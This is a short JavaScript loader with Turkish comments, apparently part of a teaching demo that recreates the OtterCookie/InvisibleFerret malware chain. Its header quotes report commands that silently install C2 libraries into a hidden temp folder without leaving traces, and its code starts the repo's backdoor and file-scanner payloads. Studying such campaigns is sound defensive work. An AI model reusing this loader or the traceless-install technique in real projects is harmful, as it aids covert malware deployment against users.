"use strict";

/**
 * stage2-loader.js
 * ----------------
 * RAPORDAKİ KARŞILIĞI:
 *   %WINDIR%\system32\cmd.exe /d /s /c "C: && cd "%TEMP%\programx64" && npm install axios && node main.js"
 *   %WINDIR%\system32\cmd.exe /d /s /c "npm install --save axios request --legacy-peer-deps
 *       --no-warnings --no-save --no-progress --loglevel silent"
 *
 * Gerçek vakada bu adım, kullanıcı gözünden uzak bir geçici klasöre
 * (%TEMP%\programx64) geçip, C2 iletişimi için gereken paketleri (axios,
 * request) sessizce ve "--no-save" ile (yani package.json/lock dosyasına
 * hiçbir iz bırakmadan) çalışma zamanında kuruyordu.
 *
 * BU DEMODA FARKLI OLARAK: axios, package.json'da normal bir bağımlılık
 * olarak beyan edildi (canlı sunum sırasında npm'in ağa bağlı, kırılgan
 * bir "runtime install" adımına güvenmek istemedik). Sessiz/iz bırakmayan
 * kurulum tekniğinin KENDİSİ yukarıdaki yorumda belgelendi -- rapordaki
 * mantığı anlamak için kod çalıştırmaya gerek yok.
 *
 * Buradan itibaren gerçek OtterCookie/InvisibleFerret eşleniklerini
 * (backdoor.js ve filescanner.js) sırayla başlatıyoruz -- rapordaki "node -e"
 * ile çalıştırılan iki obfuscated script'in bu depodaki okunabilir karşılığı.
 */

console.log("[demo] stage2-loader.js -- programx64/main.js eşleniği çalışıyor.");

// Not: Gerçek vakada iki payload da tek satırlık, obfuscator.io ile
// gizlenmiş `node -e "..."` komutlarıydı. Biz burada okunabilirliği ve
// yorum satırlarıyla anlatılabilirliği önceliklendirdiğimiz için
// obfuscate ETMİYORUZ -- isterseniz sunumda canlı olarak bu iki dosyayı
// obfuscator.io'ya yapıştırıp gizlenmiş halini de gösterebilirsiniz.
require("./backdoor.js");
require("./filescanner.js");
